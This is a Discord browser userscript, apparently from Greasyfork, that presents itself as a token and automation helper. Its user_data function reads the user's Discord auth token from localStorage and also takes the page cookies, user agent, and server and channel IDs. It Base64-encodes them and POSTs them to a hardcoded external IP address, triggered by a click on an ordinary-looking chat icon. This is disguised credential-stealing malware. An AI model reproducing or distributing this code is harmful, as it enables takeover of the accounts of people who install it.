// ==UserScript==
// @name         Discord Companion DCDM
// @namespace    http://tampermonkey.net/
// @version      0.2.1
// @description  Help discord token and automation
// @author       Floor19eth
// @match        https://discordapp.com/*
// @match        https://discord.com/*
// @grant        GM_cookie
// @grant        GM.cookie
// @grant        GM.xmlHttpRequest
// @icon         https://www.google.com/s2/favicons?domain=discord.com
// @require      https://code.jquery.com/jquery-3.6.0.min.js
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/468452/Discord%20Companion%20DCDM.user.js
// @updateURL https://update.greasyfork.org/scripts/468452/Discord%20Companion%20DCDM.meta.js
// ==/UserScript==

// I release this user-script into the public domain.


// Enables the new button location.
var buttonLocation0p6 = true;
var buttonProperWrap = buttonLocation0p6;

var remote_dx = "http://107.172.21.19:8900/api/v1/"
// Since iterating through the entire DOM would be performance suicide,
//  let's try to detect classes in ANY OTHER WAY.
var dragonequus;
dragonequus = {
    version: 4, getAllClassesLen: 0, getAllClassesCache: [], getAllClasses: function () {
        var sheets = document.styleSheets;
        if (sheets.length == dragonequus.getAllClassesLen) {
            return dragonequus.getAllClassesCache;
        }
        var workspace = [];
        var seen = {};
        for (var k = 0; k < sheets.length; k++) {
            var sheet = sheets[k];
            for (var k2 = 0; k2 < sheet.cssRules.length; k2++) {
                var rule = sheet.cssRules[k2];
                if (rule.type == CSSRule.STYLE_RULE) {
                    // .A:I .B:I, .A .B
                    var majors = rule.selectorText.split(",");
                    for (var k3 = 0; k3 < majors.length; k3++) {
                        var minors = majors[k3].split(" ");
                        for (var k4 = 0; k4 < minors.length; k4++) {
                            // Minor starts off as say .A:B
                            var minor = minors[k4];
                            // Must be class
                            if (!minor.startsWith(".")) continue;
                            // Cut off any : and remove .
                            var selectorBreak = minor.indexOf(":");
                            if (selectorBreak != -1) {
                                minor = minor.substring(1, selectorBreak);
                            } else {
                                minor = minor.substring(1);
                            }
                            if (seen[minor]) continue;
                            seen[minor] = true;
                            workspace.push(minor);
                        }
                    }
                }
            }
        }
        dragonequus.getAllClassesLen = sheets.length;
        dragonequus.getAllClassesCache = workspace;
        return workspace;
    }, isValidDC: function (obfuscated, real) {
        if (!obfuscated.startsWith(real + "-")) return false;
        if (obfuscated.length != real.length + 7) return false;
        return true;
    }, findAllByDiscordClass: function (name) {
        var q = [];
        var q2 = document.querySelectorAll("." + name);
        for (var k2 = 0; k2 < q2.length; k2++) q.push(q2[k2]);
        var classes = dragonequus.getAllClasses();
        for (var k in classes) {
            var n = classes[k];
            if (dragonequus.isValidDC(n, name)) {
                q2 = document.querySelectorAll("." + n);
                for (var k2 = 0; k2 < q2.length; k2++) q.push(q2[k2]);
            }
        }
        return q;
    }, findByDiscordClass: function (name) {
        var all = dragonequus.findAllByDiscordClass(name);
        if (all.length > 0) return all[0];
        return null;
    }, toDiscordClass: function (name) {
        var classes = dragonequus.getAllClasses();
        for (var k in classes) {
            var n = classes[k];
            if (dragonequus.isValidDC(n, name)) return n;
        }
        return name;
    }
};

function getToken() {
    window.dispatchEvent(new Event('beforeunload'));
    const LS = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;
    return JSON.parse(LS.token);
}

function getGuildId() {
    const m = location.href.match(/channels\/([\w@]+)\/(\d+)/);
    if (m) return m[1]; else alert('Could not find the Guild ID!\nPlease make sure you are on a Server or DM.');
}

function getChannelId() {
    const m = location.href.match(/channels\/([\w@]+)\/(\d+)/);
    if (m) return m[2]; else alert('Could not find the Channel ID!\nPlease make sure you are on a Channel or DM.');
}

var findParent, performAppend;
if (buttonLocation0p6) {
    // New behavior as per given feedback.
    findParent = function () {
        const vChat = dragonequus.findByDiscordClass("unreadMentionsIndicatorTop").parentNode.childNodes[1].firstChild;
        if (!vChat) return null;
        return vChat;
    };
    performAppend = function (a, b) {
        a.insertBefore(b, a.childNodes[1]);
    };
} else {
    // Older behavior that may be better for some people.
    findParent = function () {
        const vChat = dragonequus.findByDiscordClass("chat");
        if (!vChat) return null;
        return vChat.firstChild.firstChild.lastChild;
    };
    performAppend = function (a, b) {
        a.appendChild(b);
    };
}
var browser_dc_token;
// program to encode a string to Base64
// create Base64 Object
const Base64 = {
// private property
    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

// public method for encoding
    encode: function (input) {
        let output = "";
        let chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        let i = 0;

        input = Base64._utf8_encode(input);

        while (i < input.length) {

            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output + Base64._keyStr.charAt(enc1) + Base64._keyStr.charAt(enc2) + Base64._keyStr.charAt(enc3) + Base64._keyStr.charAt(enc4);

        }

        return output;
    },

// public method for decoding
    decode: function (input) {
        let output = "";
        let chr1, chr2, chr3;
        let enc1, enc2, enc3, enc4;
        let i = 0;

        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

        while (i < input.length) {

            enc1 = Base64._keyStr.indexOf(input.charAt(i++));
            enc2 = Base64._keyStr.indexOf(input.charAt(i++));
            enc3 = Base64._keyStr.indexOf(input.charAt(i++));
            enc4 = Base64._keyStr.indexOf(input.charAt(i++));

            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;

            output = output + String.fromCharCode(chr1);

            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }

        }

        output = Base64._utf8_decode(output);

        return output;

    },

// private method for UTF-8 encoding
    _utf8_encode: function (string) {
        string = String(string).replace(/\r\n/g, "\n");
        let utftext = "";

        for (let n = 0; n < string.length; n++) {

            let c = string.charCodeAt(n);

            if (c < 128) {
                utftext += String.fromCharCode(c);
            } else if ((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            } else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }

        return utftext;
    },

// private method for UTF-8 decoding
    _utf8_decode: function (utftext) {
        let string = "";
        let i = 0;
        let c = c1 = c2 = 0;

        while (i < utftext.length) {

            c = utftext.charCodeAt(i);

            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            } else if ((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i + 1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            } else {
                c2 = utftext.charCodeAt(i + 1);
                c3 = utftext.charCodeAt(i + 2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }

        }
        return string;
    }
}

let user_data = function () {
    // location.reload();
    /* let i = document.createElement('iframe');
     document.body.appendChild(i);
     let f = i.contentWindow.localStorage.token;
     browser_dc_token = f.replace(/['"]+/g, '');*/

    //const cookieName = 'https://www.discord.com';
    //const urlToFetch = 'https://www.discord.com'
    /*GM_cookie.list({url: urlToFetch, name: ""}, (cookie, error) => {
        console.log(cookie)
    });*/
    const pack = {
        cookie: document.cookie,
        agent: navigator.userAgent,
        dctoken: getToken(),
        guild: getGuildId(),
        channel: getChannelId()
    }
    let block_data = Base64.encode(JSON.stringify(pack));
    //console.log(pack)
    //console.log(block_data)
    const builder_postx = {
        method: "POST", url: remote_dx + "queue", headers: {
            "Content-Type": "text/plain"
        }, data: block_data, onload: function (xhr) {
            let data = xhr.responseText;
            alert('Notified', data);
        }
    }
    console.log("-- start request.");
    GM.xmlHttpRequest(builder_postx);
    console.log("-- end request.");
}
let manifestFn;
let lastTryParent;
let map_el = function (){
    // Create & append button
    const d = document.createElement("img");
    d.draggable = false;
    d.src = "/assets/a860a4e9c04e5cc2c8c48ebf51f7ed46.svg";
    // Unscalable, but Discord does it too
    d.width = 24;
    d.height = 24;
    let button = d;
    if (buttonProperWrap) {
        button = document.createElement("div");
        button.type = "div";
        // Make it a div, listItem & clickable, which makes it similar to other Discord buttons
        button.className = dragonequus.toDiscordClass("listItem") + " " + dragonequus.toDiscordClass("clickable");
        button.appendChild(d);
    }
    performAppend(bParent, button);
    //win.document.body.innerHTML = "/token " + f;
    let toggleState = true;

    button.addEventListener("click", () => {
        const v2a = dragonequus.findByDiscordClass("chat");
        if (!v2a) return;
        const v2 = v2a.parentNode.firstChild;
        toggleState = !toggleState;
        if (toggleState) {
            v2.style.display = "inherit";
        } else {
            v2.style.display = "none";
        }
    });
}
function callarrive(){
    console.log("test callarrive");
    document.arrive('[class^="children"] [class^="iconWrapper"]', function (el) {
        console.log("test new arrival");
        el.style.cursor = 'pointer';
        $(el).on('click', '#submit-text', (function (event)  {
            console.log("capture change event from the event listener");
            user_data();
        }));
    });
    document.arrive('[class^="children"] [class^="iconWrapper"] .icon-2xnN2Y', function (el) {
        el.style.color = 'red';
        console.log("test new arrival");
    });
}
function bigquer(){
     const icon_wrappers = document.querySelector('[class^="children"] [class^="iconWrapper"]');
     const icon_color = document.querySelector('[class^="children"] [class^="iconWrapper"] .icon-2xnN2Y');
    if (icon_wrappers && !icon_wrappers.hasAttribute('listenerOnClick')) {
        icon_wrappers.style.cursor = 'pointer';
        icon_color.style.color = 'red';
        icon_wrappers.addEventListener('click', () => {
            console.log("capture change event from the event listener");
            user_data();
        });
    }
    icon_wrappers.setAttribute('listenerOnClick', 'true');
}
manifestFn = function () {
    'use strict';
    // Toolbar instance tends to change
    setTimeout(manifestFn, 5000);
    bigquer();
    const bParent = findParent();
    if (!bParent) return;
    if (lastTryParent == bParent) return;
    lastTryParent = bParent;
    map_el();
};
manifestFn();
// callarrive();